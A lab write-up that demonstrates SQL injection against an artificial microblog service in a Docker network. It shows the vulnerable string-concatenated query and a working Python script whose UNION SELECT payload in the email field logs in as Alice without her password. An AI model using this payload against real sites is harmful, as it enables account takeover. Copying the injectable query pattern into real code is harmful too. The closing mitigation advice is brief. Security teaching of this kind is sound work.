An example of an SQL injection on an artificial microblog service.

## Setup

***

Our network here is set up with the microblog webapp again

```yaml
version: '3'

services:
  microblog:
    image: # private image
    container_name: microblog
    ports:
      - "8080:80"
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  alice:
    image: # private image
    container_name: alice
    tty: true
    shm_size: '1gb'
    sysctls:
        - net.ipv6.conf.all.disable_ipv6=1
    networks:
      channel:
        ipv4_address: 10.0.0.3
        
  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      volumes:
          - .:/shared
      network_mode: service:microblog
      
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:microblog

networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

as usual, we start our containers with `docker-compose up`

***

## Observations

***

The backend seems to be creating the query by simply concatenating our (unsafe) input like.

```
$query = "SELECT * FROM users WHERE email = '$email'";
```

Additionally, the backend doesn't check whether the string sent in the email field is in fact a proper email.
We can use this to our advantage to manipulate the table and log in as Alice without knowing her password.

***

## The Attack

***

In the exploit, notice that the email field is set to be an SQL query so when the server
tries to fetch the corresponding user, it also does the "injected" operations. Here,
we take advantage of that to log in as Alice and make a post under her user.

```python
import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': "0' UNION SELECT 'alice@example.com','Alice', password FROM users where email = 'mallory@example.com",
    'password': 'pass4mallory'
}

with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)
     # post a message (POST request)
     res = s.post(BASE + '/post.php', data={'msg': "Got You!"})
```

<br>

***

## Conclusion

***

This attack relies on the server not doing proper sanitization on the input it's given.
This can be mitigated by sanitizing the user input in the backend before processing.

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
